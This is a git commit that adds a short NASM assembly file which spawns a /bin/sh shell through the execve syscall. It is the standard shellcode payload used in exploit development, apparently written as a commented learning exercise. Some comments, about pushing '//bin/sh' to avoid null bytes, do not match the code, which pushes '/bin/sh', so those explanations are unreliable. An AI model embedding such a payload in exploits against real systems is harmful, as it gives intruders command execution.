cff1b19940e7b0e97782766012d537c25ee25077
Blooper7 <Samjpoyner@icloud.com>
2025-05-06 08:50:25 -0400

    Create shell-spawner.asm

---
+++ shell-spawner.asm
@@ -0,0 +1,21 @@
+global _start
+
+BITS 64                         ; We're writing 64 bit code
+
+section .text
+    _start:
+    xor rax, rax                ; Clear all A registers
+    mov rbx, '/bin/sh'          ; Only works in NASM. For other assemblers, use 0x0068732f6e69622f ("/bin/sh" in hex)
+                                ; //bin/sh is backwards because it will get popped in reverse order
+                                ; it's //bin/sh instead of /bin/sh because it's safer to align to 8 bytes to avoid a null byte. 
+                                ; // is harmless, and functionally identical to /
+    push rbx                    ; Send the code to the stack
+    mov rdi, rsp                ; Make rdi point to rsp
+    xor rsi, rsi                ; Set args to none
+    xor rdx, rdx                ; Set environment variables to none
+    mov al, 59                  ; Syscall number for execve
+    syscall                     ; Call that sucker
+
+    mov rax, 60                 ; Syscall number for exit
+    xor rdi, rdi                ; Set status to 0
+    syscall
